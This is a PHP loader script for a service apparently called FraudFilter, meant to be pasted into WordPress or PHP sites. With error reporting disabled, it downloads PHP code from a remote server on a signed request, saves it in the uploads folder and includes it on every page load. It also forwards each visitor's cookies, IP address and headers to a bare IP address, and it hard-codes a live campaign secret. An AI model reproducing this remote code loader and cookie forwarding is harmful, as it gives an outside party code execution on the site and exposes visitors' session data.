<?php

/**
 * Fraudfilter PHP Paste & WordPress Integration Code
 *
 * Last Update: 2024-08-28 03:09:30 UTC
 * Version: 1.0.1
 * Author: Alex Shelznyev
 *
 * Minimum Supported Version: PHP 7.4
 * Preferred Versions: PHP 8.0, 8.1, 8.2, 8.3
 * 
 * ADVANCED
 * Verification code for WordPress Plugin: Yfs^3X4AgVEzT&
 */
error_reporting(0);

class FraudFilterWordPressLoader_1adt2 {
    private $clid;
    private $campaignSecret;
    private $host;
    private $integrationType;

    public function __construct() {
        $this->clid = '1adt2';
        $this->campaignSecret = '81342400-3ddf-4835-a3de-57db44f14daa';
        $this->host = 'api.fraudfilter.io';
        $this->integrationType = 'EMBED';
    }

    public function run() {
        $fileName = $this->getFileName();

        $GLOBALS['fbIncludedFileName'] = $fileName;
        $GLOBALS['fbIncludedHomeDir'] = dirname($fileName);

        if (isset($_GET['ff17x_sign'], $_GET['ff17x_time'], $_GET['ff17x_mode'])) {
            $this->handleRequest($fileName);
        }

        if (file_exists($fileName)) {
            include($fileName);
        }
    }

    private function getFileName() {
        static $fileName = null;
        if ($fileName === null) {
            $wpmode = function_exists('wp_upload_dir');
            $home = $wpmode ? wp_upload_dir()['basedir'] : __DIR__;
            $fileName = $home . DIRECTORY_SEPARATOR . $this->clid . '.include.php';
        }
        return $fileName;
    }

    private function handleRequest($fileName) {
        if (!file_exists($fileName) || in_array($_GET['ff17x_mode'], ['diagnostics', 'upgrade'], true)) {
            if ($this->isSignatureValidTemp($_GET['ff17x_sign'], $_GET['ff17x_time'])) {
                try {
                    error_reporting(E_ALL);
                    $diagnosticsResult = $this->performDiagnosticsWP($fileName);
                    if (!$diagnosticsResult['success']) {
                        echo json_encode($diagnosticsResult);
                    } elseif ($_GET['ff17x_mode'] !== 'diagnostics' || !file_exists($fileName)) {
                        $this->downloadScriptFirstTime($fileName);
                    } else {
                        echo json_encode($diagnosticsResult);
                    }
                } catch (Exception $e) {
                    echo json_encode(['success' => false, 'errors' => [$e->getMessage()], 'version' => 4]);
                }
                exit;
            }
        }
    }

    private function isSignatureValidTemp($sign, $time) {
        return hash_equals(sha1($this->campaignSecret . '.' . $this->clid . '.' . $time), $sign);
    }

    private function getUpgradeScriptViaContentsWP() {
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => 'x-ff-secret: ' . $this->campaignSecret,
                'timeout' => 2
            ]
        ]);
        return @file_get_contents($this->getFileNameForUpdatesWP("contents"), false, $context);
    }

    private function getFileNameForUpdatesWP($type) {
        return "https://{$this->host}/v1/integration/get-updates?clid={$this->clid}&integrationType={$this->integrationType}&type=$type";
    }

    private function isSignature2ValidTemp($content) {
        return strpos($content, '@FraudFilter.io 20') !== false;
    }

    private function downloadScriptFirstTime($fileName) {
        $output = $this->getUpgradeScriptViaContentsWP();

        if ($output === false || !$this->isSignature2ValidTemp($output)) {
            $output = $this->fetchViaCurl();
        }

        if ($this->writeFile($fileName, $output)) {
            echo json_encode(['success' => true, 'phpversion' => PHP_VERSION, 'version' => 5]);
        } else {
            echo json_encode(['success' => false, 'version' => 5, 'errorMessage' => "Unable to write to file: $fileName. Please check permissions for folder: " . dirname($fileName)]);
        }
    }

    private function fetchViaCurl() {
        if (!function_exists('curl_init')) {
            throw new Exception('cURL is not available on this server.');
        }

        $ch = curl_init($this->getFileNameForUpdatesWP("curl"));
        curl_setopt_array($ch, [
            CURLOPT_HTTPHEADER => ['x-ff-secret: ' . $this->campaignSecret],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $output = curl_exec($ch);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            throw new Exception("cURL Error: $error");
        }

        if (!$this->isSignature2ValidTemp($output)) {
            throw new Exception("Malformed answer received from the server.");
        }
        return $output;
    }

    private function writeFile($fileName, $content) {
        return file_put_contents($fileName, $content, LOCK_EX) !== false;
    }

    function hasPermissionsIssuesWP($home, $fileName) {
        ob_start();
        $tempFileName = $fileName.'.tempfile';
        $tempFile = fopen($tempFileName, 'w');
        if ( !$tempFile ) {
            ob_end_clean();
            return array('code' => 'WRITE_PERMISSION','args' => array($tempFileName, $home));
        } else {
            ob_end_clean();
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
            fclose($tempFile);
            return unlink($tempFileName) ? "" : array('code' => 'UNABLE_TO_DELETE_TEMP_FILE','args' => array($tempFileName, $home));
        }
    }

    function performDiagnosticsWP($fileName) {
        header("X-FF: true");
        $errors = array();
        $extErrors = array();
        $success = true;
        $home = dirname($fileName);

        $permissionsIssues = $this->hasPermissionsIssuesWP($home, $fileName);
        if ($permissionsIssues) {
            $extErrors[] = $permissionsIssues;
            $success = false;
        }
        $serverConnectionIssues = $this->getCurlConnectionIssuesWP();
        $contentsConnectionIssues = $this->getContentsConnectionIssuesWP();
        $result = array('success' => $success, 'diagnostics' => true, 'extErrors' => $extErrors, 'errors' => $errors, 'version' => 5, 'phpversion' => PHP_VERSION, 'connection' => $serverConnectionIssues, 'contentsConnection' => $contentsConnectionIssues);
        return $result;
    }

    function getCurlConnectionIssuesWP() {
        return $this->sendRequestAndGetResultCurlWP2(true);
    }

    function getContentsConnectionIssuesWP() {
        return $this->sendRequestAndGetResultFileGetContentsWP2(true);
    }

        function sendRequestAndGetResultWP2($diagnostics) {
        return $this->sendRequestAndGetResultCurlWP2($diagnostics);
    }

    function sendRequestAndGetResultCurlWP2($diagnostics) {
        $resultObj = new stdClass();
        $resultObj->result = false;

        if ($diagnostics && !function_exists('curl_init')) {
            $resultObj->curlAnswerType = "NO_CURL";
            return $resultObj;
        }

        $url = "http://130.211.20.155/1adt2";
        $nParam = 'dd0ad1n';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => 1,
            CURLOPT_HTTPHEADER => $this->fillAllPostHeaders(),
            CURLOPT_DNS_CACHE_TIMEOUT => 120,
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_TCP_NODELAY => 1,
        ]);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);
        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CURL_ANSWER";
            $resultObj->output = $output;
            $resultObj->httpCode = $http_status;
            $resultObj->curlErrorNumber = $curl_error_number;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_curl_error_number_" . $curl_error_number . '_output' . $output . '_http_status_' . $http_status);
        } else {
            $this->processOutput($resultObj, $output, $curl_error_number, $http_status);
        }

        curl_close($ch);
        return $resultObj;
    }

    function sendRequestAndGetResultFileGetContentsWP2($diagnostics) {
        $time_start = microtime(true);
        $resultObj = new stdClass();
        $resultObj->result = false;

        $url = "http://130.211.20.155/1adt2";
        $nParam = 'dd0ad1n';
        if (isset($_GET[$nParam])) {
            $url .= '&' . $nParam . '=' . $_GET[$nParam];
        }
        if ($diagnostics) {
            $url .= "?diagnostics=true";
        }

        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => $this->getHeadersAsOneString($this->fillAllPostHeaders()),
                'timeout' => 2,
                'ignore_errors' => true
            ]
        ]);

        $output = file_get_contents($url, false, $context);
        $output = trim($output);

        if ($diagnostics) {
            $resultObj->curlAnswerType = "CONTENTS_ANSWER";
            $resultObj->output = $output;
        } elseif ($output === '' || strlen($output) <= 3) {
            $this->notifyAboutError("ANSWER_ERROR_contents_diff=" . (microtime(true) - $time_start) . '_output=' . $output);
        } else {
            $this->processOutput($resultObj, $output, null, null);
        }

        return $resultObj;
    }

    private function processOutput(&$resultObj, $output, $curl_error_number = null, $http_status = null) {
        $result = $output[0];
        $sep = $output[1];
        if ($result != '0' && $result != '1' || $sep != ';') {
            $this->notifyAboutError("INVALID_PREFIX" . ($curl_error_number ? "_curl_error_number_$curl_error_number" : "") . '_output' . $output . ($http_status ? "_http_status_$http_status" : ""));
        }
        $resultObj->type = substr($output, 2, 1);
        $resultObj->url = substr($output, 4);
        $resultObj->result = ($result === '1') ? 1 : (($output === '0') ? 0 : false);
    }

    function getHeadersAsOneString($headers) {
        $endline = "\n";
        return implode($endline, $headers) . $endline;
    }

    function fillAllPostHeaders() {
        $headers = [
            'content-length: 0',
            'X-FF-P: 81342400-3ddf-4835-a3de-57db44f14daa'
        ];

        $headerMappings = [
            'X-FF-REMOTE-ADDR' => 'REMOTE_ADDR',
            'X-FF-X-FORWARDED-FOR' => 'HTTP_X_FORWARDED_FOR',
            'X-FF-X-REAL-IP' => 'HTTP_X_REAL_IP',
            'X-FF-DEVICE-STOCK-UA' => 'HTTP_DEVICE_STOCK_UA',
            'X-FF-X-OPERAMINI-PHONE-UA' => 'HTTP_X_OPERAMINI_PHONE_UA',
            'X-FF-HEROKU-APP-DIR' => 'HEROKU_APP_DIR',
            'X-FF-X-FB-HTTP-ENGINE' => 'X_FB_HTTP_ENGINE',
            'X-FF-X-PURPOSE' => 'X_PURPOSE',
            'X-FF-REQUEST-SCHEME' => 'REQUEST_SCHEME',
            'X-FF-CONTEXT-DOCUMENT-ROOT' => 'CONTEXT_DOCUMENT_ROOT',
            'X-FF-SCRIPT-FILENAME' => 'SCRIPT_FILENAME',
            'X-FF-REQUEST-URI' => 'REQUEST_URI',
            'X-FF-SCRIPT-NAME' => 'SCRIPT_NAME',
            'X-FF-PHP-SELF' => 'PHP_SELF',
            'X-FF-REQUEST-TIME-FLOAT' => 'REQUEST_TIME_FLOAT',
            'X-FF-COOKIE' => 'HTTP_COOKIE',
            'X-FF-ACCEPT-ENCODING' => 'HTTP_ACCEPT_ENCODING',
            'X-FF-ACCEPT-LANGUAGE' => 'HTTP_ACCEPT_LANGUAGE',
            'X-FF-CF-CONNECTING-IP' => 'HTTP_CF_CONNECTING_IP',
            'X-FF-INCAP-CLIENT-IP' => 'HTTP_INCAP_CLIENT_IP',
            'X-FF-QUERY-STRING' => 'QUERY_STRING',
            'X-FF-X-FORWARDED-FOR' => 'X_FORWARDED_FOR',
            'X-FF-ACCEPT' => 'HTTP_ACCEPT',
            'X-FF-X-WAP-PROFILE' => 'X_WAP_PROFILE',
            'X-FF-PROFILE' => 'PROFILE',
            'X-FF-WAP-PROFILE' => 'WAP_PROFILE',
            'X-FF-REFERER' => 'HTTP_REFERER',
            'X-FF-HOST' => 'HTTP_HOST',
            'X-FF-VIA' => 'HTTP_VIA',
            'X-FF-CONNECTION' => 'HTTP_CONNECTION',
            'X-FF-X-REQUESTED-WITH' => 'HTTP_X_REQUESTED_WITH',
            'User-Agent' => 'HTTP_USER_AGENT',
            'Expected' => ''
        ];

        foreach ($headerMappings as $out => $in) {
            $this->addHeader($headers, $out, $in);
        }

        $hh = $this->getallheadersFF();
        foreach ($hh as $key => $value) {
            if (strtolower($key) === 'host') {
                $headers[] = 'X-FF-HOST-ORDER: ' . array_search($key, array_keys($hh));
                break;
            }
        }

        return $headers;
    }

    function getallheadersFF() {
        $headers = array();
        foreach ( $_SERVER as $name => $value ) {
            if ( substr( $name, 0, 5 ) == 'HTTP_' ) {
                $headers[ str_replace( ' ', '-', ucwords( strtolower( str_replace( '_', ' ', substr( $name, 5 ) ) ) ) ) ] = $value;
            }
        }
        return $headers;
    }

    function addHeader(& $headers, $out, $in) {
        if (!isset( $_SERVER[$in] )) {
            return;
        }
        $value = $_SERVER[$in];
        if (is_array($value)) {
            $value = implode(',', $value);
        }
        $headers[] = $out.': '.$value;
    }

    function setError($resultObj, $code, $param1 = null, $param2 = null, $param3 = null) {
        $resultObj->errorCode = $code;
        $resultObj->error = $code;
        if ($param1 != null) {
            $resultObj->$param1 = $param1;
        }
        if ($param2 != null) {
            $resultObj->$param2 = $param2;
        }
        if ($param3 != null) {
            $resultObj->$param3 = $param3;
        }
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://log.fraudfilter.io/ff-php?v=ff1&guid=1adt2&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }

}

$fraudFilterWordPressLoader_1adt2 = new FraudFilterWordPressLoader_1adt2();
$fraudFilterWordPressLoader_1adt2->run();

// @FraudFilter.io 2024-08-28 03:09:35 UTC
?>

